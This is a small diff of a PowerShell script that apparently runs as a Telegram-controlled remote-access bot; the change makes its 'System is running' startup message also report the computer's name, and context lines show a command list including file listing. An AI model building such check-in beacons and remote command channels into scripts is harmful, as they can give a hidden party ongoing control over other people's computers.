@@ -196,7 +196,7 @@ ls or dir - List files and folders.
     Send-TelegramMessage -chatId $chatId -message $helpMessage
 }
 
-Send-TelegramMessage -chatId $userId -message "System is running"
+Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"
 
 $scriptPath = $MyInvocation.MyCommand.Path
 $scriptName = [System.IO.Path]::GetFileName($scriptPath)
